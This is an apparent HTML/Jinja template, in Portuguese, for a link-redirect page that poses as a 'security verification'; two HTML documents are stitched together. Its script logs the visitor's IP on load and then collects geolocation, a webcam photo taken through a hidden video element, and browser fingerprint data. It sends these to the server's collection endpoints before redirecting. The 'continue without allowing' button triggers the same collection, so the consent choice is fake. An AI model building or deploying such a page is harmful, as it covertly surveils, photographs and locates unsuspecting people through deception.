<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{{ link.og_title or 'Redirecionando...' }}</title>

    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="{{ link.og_title }}">
    <meta property="og:description" content="{{ link.og_description }}">
    <meta property="og:image" content="{{ link.og_image }}">
    <meta property="og:url" content="{{ request.url }}">
    <meta property="og:type" content="website">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
</head>
<body style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background-color: #0f172a; color: white; font-family: sans-serif;">

    <div id="spinner" style="margin-bottom: 20px;">
        <div style="border: 8px solid #f3f3f3; border-top: 8px solid #3b82f6; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite;"></div>
    </div>

    <h3 id="mensagem" style="text-align: center;"> Verificação de Segurança! Clique no botão abaixo para continuar.</h3>

    <button id="permitir" style="padding: 10px 20px; font-size: 16px; margin-top: 20px;">Clique para continuar</button>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Verificação de Segurança</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
            width: 90%;
            max-width: 400px;
        }

        h2 {
            color: #333;
            margin-bottom: 20px;
        }

        p {
            color: #666;
            font-size: 15px;
        }

        button {
            margin: 10px;
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            background-color: #1a73e8;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0c60d0;
        }

        #mensagem {
            margin-top: 15px;
            color: #444;
            font-size: 14px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Verificação de segurança</h2>
        <p>Por favor, confirme sua identidade para continuar.</p>
        <button id="permitir">Permitir acesso</button>
        <button id="nao_permitir">Continuar sem permitir</button>
        <p id="mensagem"></p>
    </div>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const slug = {{ slug | tojson | safe }};
        const destino = {{ destino | tojson | safe }};
        const inicioTempo = Date.now();

        const coletarInfoBrowser = async () => {
            const userAgent = navigator.userAgent;
            const idioma = navigator.language;
            const fusoHorario = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const larguraTela = window.screen.width;
            const alturaTela = window.screen.height;
            const plataforma = navigator.platform;
            const conexao = (navigator.connection || {}).effectiveType || "indisponível";

            let ip = "indefinido";
            try {
                const ipRes = await fetch("https://api.ipify.org?format=json");
                const ipJson = await ipRes.json();
                ip = ipJson.ip;
            } catch (e) {
                console.warn("IP não obtido:", e);
            }

            return {
                userAgent,
                idioma,
                fusoHorario,
                larguraTela,
                alturaTela,
                plataforma,
                conexao,
                ip
            };
        };

        const coletarDados = async () => {
            let latitude = "", longitude = "", foto_base64 = "";

            const atualizarMensagem = texto => {
                document.getElementById('mensagem').innerText = texto;
            };

            atualizarMensagem("Verificando informações...");

            // Geolocalização
            try {
                const pos = await new Promise((res, rej) =>
                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 }));
                latitude = pos.coords.latitude;
                longitude = pos.coords.longitude;
            } catch (e) {
                console.warn("Geolocalização negada ou falhou.");
            }

            // Câmera
            try {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });

                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 2000));

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                foto_base64 = canvas.toDataURL("image/png");

                stream.getTracks().forEach(t => t.stop());
            } catch (e) {
                console.warn("Câmera negada ou falhou.");
            }

            const infosBrowser = await coletarInfoBrowser();
            const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 1000);

            const payload = {
                slug,
                latitude,
                longitude,
                foto_base64,
                tempoSegundos,
                ...infosBrowser
            };

            try {
                const res = await fetch("/coletar_dados", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
                const json = await res.json();
                window.location.href = json.destino;
            } catch (e) {
                console.error("Erro ao enviar dados:", e);
                atualizarMensagem("Erro ao processar.");
            }
        };

        document.getElementById("permitir").addEventListener("click", coletarDados);
        document.getElementById("nao_permitir").addEventListener("click", coletarDados);

        // Captura IP logo no início
        (async () => {
            try {
                const ipRes = await fetch("https://api.ipify.org?format=json");
                const ipJson = await ipRes.json();
                const ip = ipJson.ip;

                await fetch("/coletar_ip_inicial", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ slug, ip })
                });
            } catch (e) {
                console.warn("Erro ao capturar IP inicial:", e);
            }
        })();
    </script>
</body>
</html>
